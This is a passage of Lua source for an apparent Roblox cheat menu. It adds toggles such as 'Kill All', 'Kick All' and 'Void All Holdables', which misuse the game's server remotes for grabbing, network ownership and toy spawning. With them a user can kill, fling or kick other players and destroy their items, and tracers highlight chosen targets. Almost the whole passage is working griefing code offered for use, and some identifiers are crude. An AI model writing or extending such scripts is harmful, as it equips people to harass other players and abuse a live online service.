                dropRemote:InvokeServer(item)
            end)

            if not success or item.Parent then
                task.wait(1)

                if item.Parent then
                    processedItems[item] = nil
                end
            end
        end)
    end
end

GMisc:AddCheckbox('LoopBringAllToys', {
    Text = 'Loop Set Holdables Nil',
    Tooltip = 'Breaks all holdables making it so no one can grab them',
    Default = false,
})
Toggles.LoopBringAllToys:OnChanged(function(state)
    _G.LoopBringAllToys = state

    if state then
        task.spawn(function()
            while _G.LoopBringAllToys do
                task.wait()

                local char = plr.Character

                if not char or not char.Parent then
                    continue
                end

                local myPlotNumber = GetMyPlotNumber()
                local itemsToProcess = {}

                for _, player in ipairs(Players:GetPlayers())do
                    if player == plr then
                        continue
                    end

                    local folder = workspace:FindFirstChild(player.Name .. 'SpawnedInToys')

                    if folder then
                        for _, item in ipairs(folder:GetChildren())do
                            if targetItemsDict[item.Name] then
                                table.insert(itemsToProcess, item)
                            end
                        end
                    end
                end

                local plotItems = workspace:FindFirstChild('PlotItems')

                if plotItems then
                    for i = 1, 5 do
                        if i == myPlotNumber then
                            continue
                        end

                        local plot = plotItems:FindFirstChild('Plot' .. i)

                        if plot then
                            for _, item in ipairs(plot:GetChildren())do
                                if targetItemsDict[item.Name] then
                                    table.insert(itemsToProcess, item)
                                end
                            end
                        end
                    end
                end

                for _, item in ipairs(itemsToProcess)do
                    if not _G.LoopBringAllToys then
                        break
                    end

                    ProcessItem(item)
                end
                for item in pairs(processedItems)do
                    if not item.Parent then
                        processedItems[item] = nil
                    end
                end
            end
        end)
    else
    end
end)

Running = false

local Thread

GMisc:AddCheckbox('AntiBananaToggle', {
    Text = 'Void All Holdables',
    Tooltip = 'Instantly drops all holdables breaking them in the void',
    Default = false,
})
Toggles.AntiBananaToggle:OnChanged(function(state)
    Running = state
    getgenv().AntiBananaT = state

    if state then
        if Thread then
            task.cancel(Thread)
        end

        Thread = task.spawn(function()
            dropPos = CFrame.new(0, -999999999, 0)
            dropVec = Vector3.new(0, -999999999, 0)
            plr = game:GetService('Players').LocalPlayer
            targetItemsDict = {
                CupMugWhite = true,
                CupMugBrown = true,
                FoodBanana = true,
                FoodBread = true,
                FoodBroccoli = true,
                FoodCakePink = true,
                FoodCoconut = true,
                FoodDippyEgg = true,
                FoodDonut = true,
                FoodFrenchFries = true,
                FoodHamburger = true,
                FoodHotdog = true,
                FoodMayonnaise = true,
                FoodMeatStick = true,
                FoodMushroomPoison = true,
                FoodPizzaCheese = true,
                FoodPizzaPepperoni = true,
                FoodSodaCan = true,
                PoopPile = true,
                PoopPileSparkle = true,
                InstrumentBrassBugle = true,
                InstrumentBrassTrumpet = true,
                InstrumentDrumBongos = true,
                InstrumentDrumSnare = true,
                InstrumentGuitarAcoustic = true,
                InstrumentGuitarBanjo = true,
                InstrumentGuitarLyre = true,
                InstrumentGuitarUkulele = true,
                InstrumentGuitarViolin = true,
                InstrumentPianoKeyboard = true,
                InstrumentPianoMelodica = true,
                InstrumentVoiceMicrophone = true,
                InstrumentWoodwindOcarina = true,
                InstrumentWoodwindSaxophone = true,
                InstrumentBrassVuvuzela = true,
            }
            processedItems = {}

            function GetMyPlotNumber()
                local plots = workspace:FindFirstChild('Plots')

                if not plots then
                    return nil
                end

                for i = 1, 5 do
                    local plot = plots:FindFirstChild('Plot' .. i)

                    if plot then
                        local plotSign = plot:FindFirstChild('PlotSign')

                        if plotSign then
                            local owners = plotSign:FindFirstChild('ThisPlotsOwners')

                            if owners then
                                local ownerVal = owners:FindFirstChildOfClass('StringValue')

                                if ownerVal and ownerVal.Value == plr.Name then
                                    return i
                                end
                            end
                        end
                    end
                end

                return nil
            end
            function ProcessItem(item)
                if not Running then
                    return
                end
                if not item or not item.Parent then
                    return
                end
                if processedItems[item] then
                    return
                end

                local holdPart = item:FindFirstChild('HoldPart')

                if not holdPart then
                    return
                end

                local holdRemote = holdPart:FindFirstChild('HoldItemRemoteFunction')
                local dropRemote = holdPart:FindFirstChild('DropItemRemoteFunction')

                if holdRemote and dropRemote then
                    processedItems[item] = true

                    task.spawn(function()
                        local char = plr.Character

                        if char then
                            pcall(function()
                                holdRemote:InvokeServer(item, char)
                            end)
                            pcall(function()
                                dropRemote:InvokeServer(item, dropPos, dropVec)
                            end)
                        end
                    end)
                end
            end

            while Running do
                task.wait()

                local char = plr.Character

                if not char or not char.Parent then
                    continue
                end

                local myPlotNumber = GetMyPlotNumber()
                local itemsToProcess = {}

                for _, player in ipairs(game:GetService('Players'):GetPlayers())do
                    if player == plr then
                        continue
                    end

                    local folder = workspace:FindFirstChild(player.Name .. 'SpawnedInToys')

                    if folder then
                        for _, item in ipairs(folder:GetChildren())do
                            if targetItemsDict[item.Name] then
                                table.insert(itemsToProcess, item)
                            end
                        end
                    end
                end

                local plotItems = workspace:FindFirstChild('PlotItems')

                if plotItems then
                    for i = 1, 5 do
                        if i ~= myPlotNumber then
                            local plot = plotItems:FindFirstChild('Plot' .. i)

                            if plot then
                                for _, item in ipairs(plot:GetChildren())do
                                    if targetItemsDict[item.Name] then
                                        table.insert(itemsToProcess, item)
                                    end
                                end
                            end
                        end
                    end
                end

                for _, item in ipairs(itemsToProcess)do
                    if not Running then
                        break
                    end

                    ProcessItem(item)
                end
                for item, _ in pairs(processedItems)do
                    if not item.Parent then
                        processedItems[item] = nil
                    end
                end
            end
        end)
    else
        if Thread then
            task.cancel(Thread)

            Thread = nil
        end
    end
end)
GMisc:AddButton({
    Text = 'Use Holdables',
    Func = function()
        local useFunction = rs:WaitForChild('HoldEvents', 9e9):WaitForChild('Use', 9e9)

        for _, item in pairs(Workspace:GetDescendants())do
            if item:IsA('Model') and item:FindFirstChild('HoldPart') and useFunction then
                useFunction:FireServer(item)
            end
        end
    end,
})
GMisc:AddButton({
    Text = 'Drop Holdables',
    Func = function()
        local ch3 = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp3 = ch3:WaitForChild('HumanoidRootPart')

        for _, item in pairs(Workspace:GetDescendants())do
            if item:IsA('Model') and item:FindFirstChild('HoldPart') then
                local df = item.HoldPart:FindFirstChild('DropItemRemoteFunction')

                if df then
                    df:InvokeServer(item, hrp3.CFrame, Vector3.zero)
                end
            end
        end
    end,
})
GMisc:AddButton('Anti Banana', function()
    if char:FindFirstChild('Left Leg') and char:FindFirstChild('Right Leg') then
        local ll = char:FindFirstChild('Left Leg')
        local rl = char:FindFirstChild('Right Leg')
        local void = Workspace.FallenPartsDestroyHeight
        local pos = char.Torso.CFrame

        Workspace.FallenPartsDestroyHeight = -100

        Ragdoll:FireServer(HRP, 2)
        task.wait(0.5)

        rl.CFrame = CFrame.new(0, -1E4, 0)
        ll.CFrame = CFrame.new(0, -1E4, 0)

        task.wait(0.3)

        char.Torso.CFrame = CFrame.new(0, -9970, 0)

        task.wait(0.5)

        char.Torso.CFrame = pos

        task.wait(0.5)

        Workspace.FallenPartsDestroyHeight = void

        task.spawn(function()
            if not char:FindFirstChild('Left Leg') and not char:FindFirstChild('Right Leg') then
                while task.wait() do
                    if LocalPlayer.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                        char.Humanoid.HipHeight = 2
                    else
                        char.Humanoid.HipHeight = 0
                    end
                end
            end
        end)
    end
end)

TgtLeft = Tabs.Target:AddLeftGroupbox('Target', 'crosshair')
Tgtnon = Tabs.Target:AddLeftGroupbox('Player', 'user')
TgtMisc = Tabs.Target:AddLeftGroupbox('Configuration', 'settings')
TgtMethod = Tabs.Target:AddRightGroupbox('Methods', 'sliders-horizontal')
TgtRight = Tabs.Target:AddRightGroupbox('Loops', 'refresh-cw')
TgtOrbit = Tabs.Target:AddRightGroupbox('Orbit', 'orbit')
TgtAll = Tabs.Target:AddRightGroupbox('Server', 'server')
GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
MenuToys = ReplicatedStorage:WaitForChild('MenuToys')
HoldEvents = ReplicatedStorage:WaitForChild('HoldEvents')
SetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
CreateGrabLine = GrabEvents:WaitForChild('CreateGrabLine')
ExtendGrabLine = GrabEvents:WaitForChild('ExtendGrabLine')
DestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')
SpawnToy = MenuToys:WaitForChild('SpawnToyRemoteFunction')
DestroyToy = MenuToys:WaitForChild('DestroyToy')
UseRemote = HoldEvents:WaitForChild('Use')

function SafeInvoke(remote, ...)
    if typeof(remote) ~= 'Instance' then
        return
    end
    if remote:IsA('RemoteFunction') then
        return remote:InvokeServer(...)
    elseif remote:IsA('RemoteEvent') then
        return remote:FireServer(...)
    end
end
function SpawnToySafe(name, cf, vel)
    if typeof(SpawnToy) == 'Instance' then
        if SpawnToy:IsA('RemoteFunction') then
            return SpawnToy:InvokeServer(name, cf, vel)
        elseif SpawnToy:IsA('RemoteEvent') then
            return SpawnToy:FireServer(name, cf, vel)
        end
    elseif typeof(SpawnToy) == 'function' then
        return SpawnToy(name, cf, vel)
    end
end

Stats = game:GetService('Stats')
LocalPlayer = Players.LocalPlayer
character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
humanoid = character:WaitForChild('Humanoid')
humanoidRootPart = character:WaitForChild('HumanoidRootPart')

LocalPlayer.CharacterAdded:Connect(function(c)
    character = c
    humanoid = c:WaitForChild('Humanoid')
    humanoidRootPart = c:WaitForChild('HumanoidRootPart')
end)

BlobkickList = {}
BlobKillList = {}
BlobBringList = {}
LoopKillList = {}
PenisList = {}
ShurList = {}
ownershiplist = {}
friendslist = {}
BJList = {}
GrabItemsList = {}
frozenlist = {}
Sizelist = {
    [LocalPlayer.UserId] = 1,
}
BKA = false
BKLA = false
BKAWL = true
BKLAWL = true
BBAWL = true

local blobbin = false
local expectingblob = false
local plot = nil
local SL = Vector3.new(0, -7.35, 0)
local VeclocityService = {}
local uid = 0
local sellplr = nil

function checkgrab(itm, safe)
    safe = safe or false

    if safe then
        for _, prt in pairs(itm:GetChildren())do
            if prt:FindFirstChild('PartOwner') and prt.PartOwner.Value == LocalPlayer.Name then
                return true
            end
        end

        return false
    else
        if itm:FindFirstAncestor('Plots') or itm:FindFirstAncestor('Slots') or itm:FindFirstAncestor('Map') then
            return
        end

        local prt = itm:FindFirstChild('SoundPart') or itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('Main') or itm:FindFirstChild('Balloon')

        if itm:FindFirstChild('Humanoid') then
            if not itm.Humanoid.SeatPart then
                if prt and prt.ReceiveAge ~= 0 then
                    return false
                end
            elseif itm.Humanoid.SeatPart.Parent then
                return checkgrab(itm.Humanoid.SeatPart.Parent)
            end
        elseif prt and prt.ReceiveAge ~= 0 then
            return false
        end

        return true
    end
end

local blob = nil

function BlobKick()
    while true do
        local listtype = 1

        if BKA or BKLA then
            listtype = 2
        end

        blobbin = false

        for _, plr in pairs(Players:GetPlayers())do
            if BlobBringList[plr.UserId] and plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and checkgrab(plr.Character) then
                if BlobBringList[plr.UserId] == 'None' or BlobBringList[plr.UserId] == 'crip' or not BlobBringList[plr.UserId] or BlobBringList[plr.UserId] == 'bris' then
                    if BlobBringList[plr.UserId] == 'crip' then
                        plr.Character.Humanoid.WalkSpeed = 0
                    end

                    BlobBringList[plr.UserId] = nil
                else
                    plr.Character.HumanoidRootPart.CFrame = BlobBringList[plr.UserId]
                    plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    BlobBringList[plr.UserId] = nil
                end
            elseif BlobkickList[plr.UserId] or BlobKillList[plr.UserId] or BlobBringList[plr.UserId] or BKA or BKLA then
                local j, h

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                    j = LocalPlayer.Character.HumanoidRootPart.CFrame
                    h = LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity
                end

                local continue1 = nil

                if BlobBringList[plr.UserId] and BlobBringList[plr.UserId] ~= 'bris' then
                    continue1 = 'Bring'
                elseif BlobKillList[plr.UserId] or BlobBringList[plr.UserId] == 'bris' then
                    continue1 = 'Kill'
                elseif BlobkickList[plr.UserId] then
                    continue1 = 'Kick'
                else
                    if BKA then
                        if BKAWL then
                            if not friendslist[plr.UserId] then
                                continue1 = 'Kick'
                            end
                        else
                            continue1 = 'Kick'
                        end
                    end
                    if BKLA then
                        if BKLAWL then
                            if not friendslist[plr.UserId] then
                                continue1 = 'Kill'
                            end
                        else
                            continue1 = 'Kill'
                        end
                    end
                end
                if plr ~= LocalPlayer and continue1 then
                    local continue = false

                    if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
                        if plr.Character.HumanoidRootPart.Massless then
                            if plr.Character.Humanoid.SeatPart then
                                continue = true
                            end
                        else
                            continue = true
                        end
                    end

                    local smegma = true

                    while smegma and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and plr and plr.Character and (continue1 == 'Kick' or continue1 == 'Kill' or continue1 == 'Bring') and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character.HumanoidRootPart.CFrame.Position.Magnitude < 1000000 and plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and continue do
                        if listtype == 2 then
                            if not BKA and not BKLA then
                                smegma = false
                            elseif friendslist[plr.UserId] then
                                smegma = false
                            end
                        else
                            if not BlobkickList[plr.UserId] and not BlobKillList[plr.UserId] and not BlobBringList[plr.UserId] then
                                smegma = false
                            end
                        end

                        blobbin = true

                        if smegma and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Parent.Name == 'CreatureBlobman' then
                            expectingblob = true
                            blob = LocalPlayer.Character.Humanoid.SeatPart.Parent

                            if blob:FindFirstChild('HumanoidCreature') then
                                blob.HumanoidCreature.PlatformStand = true
                            end
                            if blob:WaitForChild('RightDetector', 0.5) and blob.RightDetector:WaitForChild('RightWeld', 0.5) then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = (plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -20, 10)) + (plr.Character.HumanoidRootPart.AssemblyLinearVelocity / math.pi)
                                LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity

                                if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
                                    if continue1 == 'Bring' then
                                        if plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid.Health ~= 0 and blob and blob:FindFirstChild('RightDetector') and blob.RightDetector:FindFirstChild('RightWeld') and blob:FindFirstChild('BlobmanSeatAndOwnerScript') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab') and blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureRelease') then
                                            if checkgrab(plr.Character) then
                                                if BlobBringList[plr.UserId] == 'None' or BlobBringList[plr.UserId] == 'crip' or not BlobBringList[plr.UserId] then
                                                    plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)

                                                    if BlobBringList[plr.UserId] == 'crip' then
                                                        plr.Character.Humanoid.WalkSpeed = 0
                                                    end

                                                    BlobBringList[plr.UserId] = nil
                                                else
                                                    plr.Character.HumanoidRootPart.CFrame = BlobBringList[plr.UserId]
                                                    plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                                                    BlobBringList[plr.UserId] = nil

                                                    if BlobkickList[plr.UserId] or (BKA and (BKAWL and not LocalPlayer:IsFriendsWith(plr.UserId) or not BKAWL)) then
                                                        continue1 = 'Kick'
                                                    end
                                                end
                                            else
                                                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                                blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(blob.RightDetector.RightWeld, plr.Character.HumanoidRootPart)
                                            end
                                        end
                                    elseif continue1 == 'Kick' then
                                        if plr.Character.Parent == workspace then
                                            if checkgrab(plr.Character, true) then
                                                plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1E10, 0)

                                                ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(plr.Character.HumanoidRootPart)
                                                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                            else
                                                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(plr.Character.HumanoidRootPart, CFrame.lookAt(LocalPlayer.Character.HumanoidRootPart.CFrame.Position, plr.Character.HumanoidRootPart.CFrame.Position))
                                            end
                                        else
                                            BlobBringList[plr.UserId] = CFrame.new(-73, -6, -265.5)
                                            smegma = false
                                        end
                                    else
                                        if plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid.Health ~= 0 then
                                            if BlobBringList[plr.UserId] == 'bris' then
                                                BlobBringList[plr.UserId] = nil
                                            end

                                            plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                            blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(blob.RightDetector, plr.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                                            blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(blob.RightDetector.RightWeld, plr.Character.HumanoidRootPart)
                                        end
                                    end
                                end
                            else
                                ReplicatedStorage.MenuToys.DestroyToy:FireServer(workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman') or plot and workspace.PlotItems[plot]:FindFirstChild('CreatureBlobman'))
                            end
                        else
                            expectingblob = true

                            if LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart and (LocalPlayer.Character.Humanoid.SeatPart.Parent and LocalPlayer.Character.Humanoid.SeatPart.Parent.Name ~= 'CreatureBlobman' or not LocalPlayer.Character.Humanoid.SeatPart.Parent) then
                                LocalPlayer.Character.Humanoid.Sit = false
                            end
                            if blob and blob:FindFirstChild('VehicleSeat') then
                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
                                    blob.VehicleSeat:Sit(LocalPlayer.Character.Humanoid)
                                end
                            else
                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                                    while smegma and not blob do
                                        if listtype == 2 then
                                            if not BKA and not BKLA then
                                                smegma = false
                                            elseif friendslist[plr.UserId] then
                                                smegma = false
                                            end
                                        else
                                            if not (BlobkickList[plr.UserId] or BlobKillList[plr.UserId] or BlobBringList[plr.UserId]) then
                                                smegma = false
                                            end
                                        end
                                        if workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman') or plot and workspace.PlotItems[plot]:FindFirstChild('CreatureBlobman') then
                                            blob = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys'):FindFirstChild('CreatureBlobman') or workspace.PlotItems[plot]:FindFirstChild('CreatureBlobman')

                                            if not (blob:WaitForChild('RightDetector', 0.5) and blob:FindFirstChild('RightDetector') and blob.RightDetector:WaitForChild('RightWeld', 0.5)) then
                                                ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob)
                                            end
                                        end
                                        if not blob then
                                            task.spawn(function()
                                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15), Vector3.new(0, 0, 0))
                                            end)
                                        end

                                        task.wait()
                                    end
                                end
                            end
                        end

                        task.wait()
                    end

                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = j
                        LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = h
                    end
                end
            end
        end

        if not blobbin and blob then
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('Humanoid') and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent == blob then
                LocalPlayer.Character.Humanoid.Sit = false
            end

            task.wait()

            if blob and blob:FindFirstChild('HumanoidRootPart') then
                blob.HumanoidRootPart.CFrame = CFrame.new(0, 1e15, 0)
            end
        end

        expectingblob = false

        task.wait()
    end
end

task.spawn(BlobKick)
TgtAll:AddCheckbox('BlobKillAll', {
    Text = 'Kill All',
    Default = false,
    Tooltip = 'Kills all players instantly when enabled',
})
Toggles.BlobKillAll:OnChanged(function(state)
    BKLA = state
end)
TgtAll:AddCheckbox('BlobKickAll', {
    Text = 'Kick All',
    Default = false,
    Tooltip = 'Kicks all players using a blobman when enabled',
})
Toggles.BlobKickAll:OnChanged(function(state)
    BKA = state
end)

GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
RemoteSetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
RemoteDestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')
SelectedPlayer = nil
KillHB = nil
LoopKickOn = false
LoopKillOn = false
LoopBlobKickOn = false
LoopBlobKillOn = false
LoopGrabKickOn = false
HEIGHT_LIMIT = 100000
TELEPORT_OFFSET = Vector3.new(6, -18.5, 0)
autoBlobmanEnabled = false
processingBlobmans = {}
TweenService = game:GetService('TweenService')
Analytics = game:GetService('RbxAnalyticsService')
UserInputService = game:GetService('UserInputService')
TextChatService = game:GetService('TextChatService')
HttpService = game:GetService('HttpService')
RunService = game:GetService('RunService')
StarterGui = game:GetService('StarterGui')
rs = game:GetService('ReplicatedStorage')
RF = game:GetService('ReplicatedFirst')
Players = game:GetService('Players')
Workspace = game:GetService('Workspace')
DestroyToy = rs.MenuToys.DestroyToy
BombExplode = rs.BombEvents.BombExplode
SetNetOwner = rs.GrabEvents.SetNetworkOwner
CreateLine = rs.GrabEvents.CreateGrabLine
DestroyLine = rs.GrabEvents.DestroyGrabLine
SpawnToy = rs.MenuToys.SpawnToyRemoteFunction
Struggle = rs.CharacterEvents.Struggle
Ragdoll = rs.CharacterEvents.RagdollRemote
StopVel = rs.GameCorrectionEvents.StopAllVelocity
UpdLineColor = rs.DataEvents.UpdateLineColorsEvent
StickyEvent = rs.PlayerEvents.StickyPartEvent
jerkspeed = 0.1
spinspeed = 10
strength = 300
offset = CFrame.new(0, 15, 0)

local PalletForRagdoll

Seats = {}
WhitelistEnabled = false
Lines = 0
Camera = workspace.CurrentCamera
plr = Players.LocalPlayer
Mouse = plr:GetMouse()
cons = {}
inv = workspace[plr.Name .. 'SpawnedInToys']
char = plr.Character
HRP = char.HumanoidRootPart
hum = char.Humanoid

plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)

    if c then
        HRP = c:FindFirstChild('HumanoidRootPart') or c:WaitForChild('HumanoidRootPart', 1)
        hum = c:FindFirstChild('Humanoid') or c:WaitForChild('Humanoid', 1)
        char = c
    end
end)

function gblob()
    local char = plr.Character
    local hum = char:WaitForChild('Humanoid', 0.1)

    if hum and hum.SeatPart then
        if hum.SeatPart.Parent.Name == 'CreatureBlobman' then
            return hum.SeatPart.Parent
        end
    end
end
function disc(name)
    for i, v in cons do
        if i == name then
            v:Disconnect()
        end
    end
end
function getplot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild('Plot' .. i)
        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end
function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end
function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end

    local t
    local toyadded

    toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c

            toyadded:Disconnect()
        end
    end)

    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
    end)

    local time = tick() + 1

    repeat
        task.wait()
    until t or tick() > time

    if t then
        return t
    else
        local plot = getplot()

        if plot then
            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end
function grab(obj)
    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
end
function drop(obj, cf)
    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, vector.create(0, 0, 0))
end
function tp(obj1, obj2)
    obj1.CFrame = CFrame.new(obj2.Position + obj2.Velocity * (game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() / 1000) * 5)
end
function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end
function getname(v)
    return v:split(' ')[2]:split('(')[2]:split(')')[1]
end
function HasProperty(obj, property)
    local ok = pcall(function()
        if obj[property] then
        end
    end)

    return ok
end

SelectedPlayer = nil
lastGrabberDisplay = 'None'
lastGrabberName = nil
_selectedPlayers = {}
_killRoundIndex = 1
_dropdownUpdating = false
_previouslyTargeted = {}
_tracerEnabled = false
_tracerConnections = {}
_tracerParts = {}
_tracerObjects = {}
_isViewing = false

local PLOT_NAMES = {
    [1] = 'Blue House',
    [2] = 'Pink House',
    [3] = 'Spooky House',
    [4] = 'Chinese House',
    [5] = 'Green House',
}
local PLOT_COLORS = {
    [1] = '#5eb8ff',
    [2] = '#ff85c2',
    [3] = '#b06fff',
    [4] = '#ffcc55',
    [5] = '#55e87a',
}

RunService.Heartbeat:Connect(function()
    if #_selectedPlayers == 0 then
        SelectedPlayer = nil

        return
    end
    if _killRoundIndex > #_selectedPlayers then
        _killRoundIndex = 1
    end

    SelectedPlayer = _selectedPlayers[_killRoundIndex]
    _killRoundIndex = _killRoundIndex % #_selectedPlayers + 1
end)

function getPlayerList()
    local list = {}

    for _, plr in ipairs(Players:GetPlayers())do
        if plr ~= LocalPlayer then
            table.insert(list, plr.DisplayName .. ' (@' .. plr.Name .. ')')
        end
    end

    return list
end
function extractUsername(entry)
    return entry and entry:match('@([%w_]+)')
end
function getSelectedPlayer()
    for _, un in ipairs(_selectedPlayers)do
        local p = Players:FindFirstChild(un)

        if p then
            return p
        end
    end

    return nil
end
function _syncPreviousTargets()
    for _, un in ipairs(_selectedPlayers)do
        _previouslyTargeted[un] = true
    end
end
function _removeFromTargets(username)
    for i, un in ipairs(_selectedPlayers)do
        if un == username then
            table.remove(_selectedPlayers, i)

            break
        end
    end
end
function _refreshDropdown()
    _dropdownUpdating = true

    PlayerDropdown:SetValues(getPlayerList())

    _dropdownUpdating = false
end
function getPlayerPlot(player)
    local plotsFolder = workspace:FindFirstChild('Plots') or workspace:FindFirstChild('plots')

    if not plotsFolder then
        return nil, nil
    end

    for i = 1, 5 do
        local plot = plotsFolder:FindFirstChild('Plot' .. i)

        if plot then
            for _, desc in ipairs(plot:GetDescendants())do
                local vt = desc.ClassName

                if vt == 'StringValue' or vt == 'ObjectValue' or vt == 'IntValue' then
                    local ok, v = pcall(function()
                        return tostring(desc.Value)
                    end)

                    if ok and v and v:find(player.Name, 1, true) then
                        return plot, i
                    end
                end
            end
        end
    end

    return nil, nil
end
function targetInPlot(player)
    if not player or not player.Character then
        return false
    end

    local hrp = player.Character:FindFirstChild('HumanoidRootPart')
    local plot = getPlayerPlot(player)

    if not hrp or not plot then
        return false
    end

    local base = plot:FindFirstChild('Base') or plot:FindFirstChildWhichIsA('BasePart')

    if not base then
        return false
    end

    local pos = base.CFrame:PointToObjectSpace(hrp.Position)
    local half = base.Size / 2

    return math.abs(pos.X) <= half.X and math.abs(pos.Z) <= half.Z and math.abs(pos.Y) <= (half.Y + 25)
end
function getPlotRichText(player)
    local plot, idx = getPlayerPlot(player)

    if not plot or not idx then
        return "<font color='#555555'>None</font>"
    end

    name = PLOT_NAMES[idx] or ('Plot ' .. idx)
    col = PLOT_COLORS[idx] or '#ffffff'
    inside = targetInPlot(player)
    tag = inside and "  <font color='#55e87a'>[Inside]</font>" or "  <font color='#ffaa33'>[Nearby]</font>"

    return "<font color='" .. col .. "'><b>" .. name .. '</b></font>' .. tag
end

_currentAvatarUserId = nil

function _updateAvatarDisplay()
    local primary = _selectedPlayers[1] and Players:FindFirstChild(_selectedPlayers[1])

    if not primary then
        _currentAvatarUserId = nil

        pcall(function()
            AvatarImage:SetImage('rbxassetid://0')
        end)

        return
    end

    local uid = primary.UserId

    if uid == _currentAvatarUserId then
        return
    end

    _currentAvatarUserId = uid

    task.spawn(function()
        local ok, content = pcall(Players.GetUserThumbnailAsync, Players, uid, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size420x420)

        if ok and content and content ~= '' then
            pcall(function()
                AvatarImage:SetImage(content)
            end)
        end
    end)
end

_tracerObjects = {}

function _cleanupTracers()
    for _, c in ipairs(_tracerConnections)do
        pcall(function()
            c:Disconnect()
        end)
    end
    for _, obj in ipairs(_tracerObjects)do
        pcall(function()
            obj.line:Remove()
        end)
        pcall(function()
            if obj.shadow then
                obj.shadow:Remove()
            end
        end)
        pcall(function()
            if obj.dot then
                obj.dot:Remove()
            end
        end)
        pcall(function()
            obj.highlight:Destroy()
        end)
    end

    _tracerConnections = {}
    _tracerObjects = {}

    for _, p in ipairs(_tracerParts)do
        pcall(function()
            p:Destroy()
        end)
    end

    _tracerParts = {}
end
function _buildTracerFor(plr)
    if not plr or not plr.Character then
        return
    end

    char = plr.Character
    hrp = char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end

    hl = Instance.new('Highlight')
    hl.Name = '_PhantHL_' .. plr.Name
